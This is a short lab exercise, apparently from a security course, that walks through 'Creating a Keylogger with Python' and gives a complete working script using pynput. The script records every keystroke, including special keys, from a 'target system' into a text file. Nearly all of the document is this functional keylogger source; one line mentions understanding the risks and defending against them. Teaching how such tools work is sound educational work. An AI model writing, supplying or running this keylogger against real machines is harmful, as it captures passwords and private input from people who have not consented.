PRACTICAL NO. 7
AIM: Creating a Keylogger with Python
 Write a Python script that captures and logs keystrokes from a target
system.
 Execute the keylogger script and observe the logged keystrokes.
 Understand the potential security risks associated with keyloggers
and the importance of protecting against them.
Code:
# keylogger.py
from pynput import keyboard

log_file = "keystrokes.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")  # Logs normal characters
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")  # Logs special keys (Enter, Shift, etc.)

# Listener setup
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
Output: keystrokes.txt
